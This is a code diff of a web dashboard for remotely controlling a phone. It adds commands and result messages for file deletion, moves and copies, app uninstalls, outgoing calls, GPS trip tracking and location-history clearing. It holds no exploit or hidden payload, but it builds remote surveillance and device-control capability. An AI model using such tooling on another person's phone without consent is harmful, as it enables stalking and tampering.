@@ -573,6 +573,96 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'FILE_DELETE_RESULT': {
+          if (p.success) {
+            pushToast('File/folder deleted successfully', 'success');
+          } else {
+            pushToast(`Delete failed: ${p.error || 'Unknown error'}`, 'error');
+          }
+          break;
+        }
+
+        case 'FILE_RENAME_RESULT': {
+          if (p.success) {
+            pushToast(`Renamed to "${p.newName}"`, 'success');
+          } else {
+            pushToast(`Rename failed: ${p.error || 'Unknown error'}`, 'error');
+          }
+          break;
+        }
+
+        case 'FILE_MKDIR_RESULT': {
+          if (p.success) {
+            pushToast(`Folder "${p.folderName}" created`, 'success');
+          } else {
+            pushToast(`Create folder failed: ${p.error || 'Unknown error'}`, 'error');
+          }
+          break;
+        }
+
+        case 'FILE_MOVE_RESULT': {
+          if (p.success) {
+            pushToast(`Moved to "${p.destPath}"`, 'success');
+          } else {
+            pushToast(`Move failed: ${p.error || 'Unknown error'}`, 'error');
+          }
+          break;
+        }
+
+        case 'FILE_COPY_RESULT': {
+          if (p.success) {
+            pushToast(`Copied to "${p.destPath}"`, 'success');
+          } else {
+            pushToast(`Copy failed: ${p.error || 'Unknown error'}`, 'error');
+          }
+          break;
+        }
+
+        case 'UNINSTALL_APP_RESULT': {
+          if (p.success) {
+            pushToast('Uninstall prompt displayed on phone screen', 'success');
+          } else {
+            pushToast(`Uninstall failed: ${p.error || 'Unknown error'}`, 'error');
+          }
+          break;
+        }
+
+        case 'LOCATION_BATCH_UPDATE': {
+          pushToast(`Synced ${p.count || (p.waypoints && p.waypoints.length) || 0} offline GPS trip points!`, 'success');
+          break;
+        }
+
+        case 'LOCATIONS_CLEARED': {
+          pushToast('Location trip history cleared', 'info');
+          break;
+        }
+
+        case 'TIMELINE_CONFIG_RESULT': {
+          if (p.success) {
+            pushToast(
+              p.enabled
+                ? `Trip Recording ACTIVE (Idle Filter: ${p.minRadiusMeters}m / ${p.dwellMinutes}m)`
+                : 'Trip Recording paused (Standby GPS mode)',
+              p.enabled ? 'success' : 'info'
+            );
+          } else {
+            pushToast(`Trip config error: ${p.error || 'Failed'}`, 'error');
+          }
+          break;
+        }
+
+        case 'CALL_OUTGOING_RESULT': {
+          if (p.success) {
+            pushToast(
+              p.mode === 'direct_call' ? `Calling ${p.number}...` : `Dialer opened for ${p.number}`,
+              'success'
+            );
+          } else {
+            pushToast(`Call failed: ${p.error || 'Failed to place call'}`, 'error');
+          }
+          break;
+        }
+
         default:
           break;
       }
@@ -707,7 +797,12 @@ function titleOrApp(appName, title, text) {
       callBlocklist: activeDeviceId ? (callBlocklist[activeDeviceId] || { enabled: false, numbers: [] }) : { enabled: false, numbers: [] },
       vibratePhone: (durationMs, pattern) => sendCommand('vibrate', { deviceId: activeDeviceId, durationMs, pattern }),
       speakTts: (text, speed, pitch) => sendCommand('tts', { deviceId: activeDeviceId, text, speed, pitch }),
-      playAudio: (url, loop) => sendCommand('play-audio', { deviceId: activeDeviceId, url, loop }),
+      playAudio: (urlOrOpts, loop, data) => {
+        if (typeof urlOrOpts === 'object' && urlOrOpts !== null) {
+          return sendCommand('play-audio', { deviceId: activeDeviceId, ...urlOrOpts });
+        }
+        return sendCommand('play-audio', { deviceId: activeDeviceId, url: urlOrOpts, loop, data });
+      },
       stopAudio: () => sendCommand('play-audio-stop', { deviceId: activeDeviceId }),
       setWallpaper: (payload) => sendCommand('wallpaper', { deviceId: activeDeviceId, ...payload }),
       refreshDeviceInfo: () => sendCommand('device-info', { deviceId: activeDeviceId }),
@@ -849,6 +944,28 @@ function titleOrApp(appName, title, text) {
       fetchGallery: (limit = 36) => {
         setGalleryLoading(true);
         sendCommand('media-gallery', { deviceId: activeDeviceId, limit });
+      },
+      // File Manager Extended Operations
+      deleteFile: (path) => sendCommand('file-delete', { deviceId: activeDeviceId, path }),
+      renameFile: (path, newName) => sendCommand('file-rename', { deviceId: activeDeviceId, path, newName }),
+      createFolder: (parentPath, folderName) => sendCommand('file-mkdir', { deviceId: activeDeviceId, parentPath, folderName }),
+      moveFile: (sourcePath, destParentPath) => sendCommand('file-move', { deviceId: activeDeviceId, sourcePath, destParentPath }),
+      copyFile: (sourcePath, destParentPath) => sendCommand('file-copy', { deviceId: activeDeviceId, sourcePath, destParentPath }),
+      // Remote App Uninstaller
+      uninstallApp: (packageName) => sendCommand('uninstall-app', { deviceId: activeDeviceId, packageName }),
+      // Remote Outgoing Phone Call
+      makeCall: (number) => sendCommand('call-outgoing', { deviceId: activeDeviceId, number }),
+      // Location Trip & Timeline Remote Config
+      setTimelineTracking: (enabled, minRadiusMeters = 200, dwellMinutes = 5) =>
+        sendCommand('timeline-config', { deviceId: activeDeviceId, enabled, minRadiusMeters, dwellMinutes }),
+      clearLocationHistory: async () => {
+        try {
+          const res = await fetch(`/api/devices/${activeDeviceId}/location/history`, { method: 'DELETE' });
+          const out = await res.json();
+          if (out && out.success) {
+            pushToast('Trip history cleared', 'info');
+          }
+        } catch (_) {}
       },
       removeDevice: async (deviceId) => {
         try {
